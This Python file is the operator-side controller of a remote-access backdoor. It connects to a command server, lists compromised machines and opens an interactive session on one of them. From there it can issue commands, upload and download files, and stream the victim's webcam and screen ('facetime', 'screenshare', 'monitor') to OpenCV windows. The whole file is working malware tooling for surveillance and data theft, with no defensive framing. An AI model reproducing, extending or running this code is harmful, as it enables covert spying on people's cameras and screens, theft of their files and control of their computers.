import os
import time
import socket
import threading
import cv2
import numpy as np

from dotenv import load_dotenv
from backdoor import handleCommands

from communication import ObjectCommunication, ByteCommunication
from models.command import Command, findById
from models.packet import Packet
from modules import download, upload

class Hacker:
    def __init__(self, ip, port, port1) -> None:
        self.mainSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.fastSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        print(f"{OK} Connecting to ip: {ip} | port: {port}")
        self.mainSock.connect((ip, port))
        print(f"{OK} Successfully connected first socket ip:{ip} port:{port}")
        self.mainSock.send(HACKERID)
        print(f"{OK} ID sent")
        self.fastSock.connect((ip, port1))
        print(f"{OK} Successfully connected second socket ip:{ip} port:{port1}")

        self.mainComms = ObjectCommunication(self.mainSock)
        self.fastComms = ByteCommunication(self.fastSock)

        self.commands = []
        self.inDoor = False

    def displayALlResults(self):
        commandList = self.commands.copy()
        for c in commandList:
            if c.done:
                print(c.result)
                commandList.remove(c)

        self.commands = commandList

def enterBackdoor(hacker:Hacker):
    print(f"{OK} Entered backdoor")

    hacker.inDoor = True

    thread = threading.Thread(target=handleResults, args=(hacker,))
    thread.start()

    while True:
        command = input("> ").split(" ")
        if command[0] == "results":
            hacker.displayALlResults()
            continue

        command = Command(command[0], command[1:])

        if command.command == "upload":
            command.file = download(command).encode()

        if command.command == "exit":
            pack = Packet("exit", None)
            hacker.mainComms.send(pack)
            break

        pack = Packet("new", command)
        hacker.mainComms.send(pack)
        status = hacker.mainComms.receive()

        hacker.commands.append(command)

        if not status:
            break

        elif command.output:
            waitExectution(command, hacker)

            if command.result == None:
                hacker.commands.remove(command)
                print(f"{ERROR} Something happend to the backdoor")
                break

            print(command.result)


    print(f"{OK} Exited backdoor")


def waitExectution(command, hacker):
    while not command.result:
        pack = Packet("progress", command._id)
        hacker.mainComms.send(pack)
        try:
            progress = hacker.mainComms.receive()

            if progress:
                print(progress)
            elif progress is False:
                break

        except KeyboardInterrupt:
            pack = Packet("abort", command._id)
            hacker.mainComms.send(pack)
            command.result = hacker.mainComms.receive()
        
def handleResults(hacker:Hacker):
    while hacker.inDoor:
        result = hacker.fastComms.receive()
        if result == b"0":
            break

        result = result.split(b"<ID>")
        id = result[0]
        payload = result[1]

        command = findById(int(id), hacker.commands)
        if command and not command.done:
            if b"[-]" in payload:
                command.result = payload.decode()

            elif command.command in ["screenshare", "facetime", "monitor"]:
                if command.command == "monitor":
                    payload = payload.split(b"<SPLIT>")
                    if displayImage(payload[0], "camera") and displayImage(payload[1], "screen"):
                        continue

                else:
                    if displayImage(payload, command.command):
                        continue

                if not command.output:
                    hacker.mainComms.send({"command":"abort", "payload":command._id})
                    command.result = hacker.mainComms.receive()
                    command.done = True
                    cv2.destroyAllWindows()

            elif command.command == "download":
                command.file = payload
                upload(command)
                command.result = f"{OK} Successfully downloaded file"
                command.done = True

            else:
                command.result = "[+] " + payload.decode()
                command.done = True

    cv2.destroyAllWindows()

def displayImage(payload, windowname):
    frame = np.frombuffer(payload, np.uint8)
    frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
    cv2.imshow(windowname, frame)
    if cv2.waitKey(1) & 0xFF == ord("q"):
        return False
    return True

def main():
    hacker = Hacker(ip, port, port1)

    while True:
        clientList = hacker.mainComms.receive()
        for client in clientList:
            print(f"Name: {client["name"]}\t|\tAddress: {client["addr"]}")

        action = input("\n> ")
        hacker.mainComms.send({"status":True, "action":action})

        if action == "exit" or action == "exitServer":
            break

        result = hacker.mainComms.receive()
        if result["status"]:
            enterBackdoor(hacker)
        else:
            print(f"{ERROR} {result["msg"]}. Error: {result["error"]}")
 
load_dotenv()

OK = "[+]"
ERROR = "[-]"

HACKERID = os.environ.get("HACKERID").encode()

ip = os.environ.get("IP")
port = int(os.environ.get("PORT1"))
port1 = int(os.environ.get("PORT2"))

if __name__ == "__main__":
    main()
